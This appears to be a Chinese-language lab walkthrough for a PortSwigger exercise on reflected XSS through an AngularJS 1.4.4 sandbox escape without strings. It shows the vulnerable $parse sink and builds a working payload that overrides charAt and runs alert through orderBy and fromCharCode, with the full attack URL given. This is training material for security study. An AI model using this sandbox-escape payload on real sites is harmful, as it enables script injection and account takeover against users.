# 实验：不使用字符串的 AngularJS 沙箱逃逸反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings

本实验以一种不寻常的方式使用 AngularJS，其中 `$eval` 函数不可用，并且你将无法在 AngularJS 中使用任何字符串。

为了解决本实验，请执行一个跨站脚本攻击，在不使用 `$eval` 函数的情况下逃逸沙箱并执行 `alert` 函数。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=ag8uefo9 HTTP/2
    ```

    - 服务器响应
        ```html
        <script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>

        <section class=blog-header>
            <script>
                angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
                    $scope.query = {};
                    var key = 'search';
                    $scope.query[key] = 'ag8uefo9';
                    $scope.value = $parse(key)($scope.query);
                });
            </script>
            <h1 ng-controller=vulnCtrl>
                0 search results for {{value}}
            </h1>
            <hr>
        </section>
        ```
        - 暴露 angular 版本
        - 源，搜索参数的名值对被嵌入到 JS 字符串中
        - 汇，`$parse` 函数将字符串变量 `key` 解析为取值函数
            - `$parse(key)($scope.query)` 相当于 `$scope.query[key]`
            - 若可控制对象 `key` 的值，则可被 `$parse` 解析执行

    - 浏览器模板渲染
        ```html
            <h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">0 search results for ag8uefo9</h1>
            <hr>
        ```

测试
- 单引号被 HTML 编码
- 除原始的 search 键值对外，额外添加测试键值对
    ```http
    GET /?search=test&foo=bar HTTP/2
    ```
    
    - 服务器响应
        ```js
        var key = 'search';
        $scope.query[key] = 'test';
        $scope.value = $parse(key)($scope.query);
        var key = 'foo';
        $scope.query[key] = 'bar';
        $scope.value = $parse(key)($scope.query);
        ```
        - 新增的键值对被额外添加到代码中
        - 此时 JS 的对象 `key` 可控
攻击
- 在搜索段新增名值对，新名即为主要载荷位置 `$parse(key)`，注意符号 URL 编码
    - 覆盖沙箱过滤器
        ```js
        // 基础载荷
        'a'.constructor.prototype.charAt = [].join;
        ```
        - 无法使用单引号，寻找无单引号构建字符串的方式
            - `toString()` 返回固定字符串 `"[object Undefined]"`

            ```js
            &toString().constructor.prototype.charAt = [].join;
            ```
    - 执行载荷

        ```js
        // 基础载荷
        [1]|orderBy:'x=alert()'
        ```
        - 无法使用单引号，寻找无单引号构建字符串的方式 `x=alert()`
            - `String().fromCharCode()` 转 ASCII 码为字符

        ```js
        [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,41)
        ```

    - 最终载荷
        ```js
        ?search=test&<@urlencode>toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,41)</@urlencode>=foooo
        ```
        - 末尾的任意非空值 `=foooo` 确保 `$parse(key)($scope.query)` 正常执行

- 额外测试
    - 列表合并元素为字符串 `[].join()` 返回 `""` 空字符对象
    - 列表加法运算返回字符串对象，似乎进行字符串运算而调用 `toString()` 方法
        - `[]+[]` => `""`
        - `1+[]` => `"1"`
        - `window+[]` => `"[object Window]"`
        - `[]+{}` => `"[object Object]" `
    - `[].toLocaleString()` => `""`
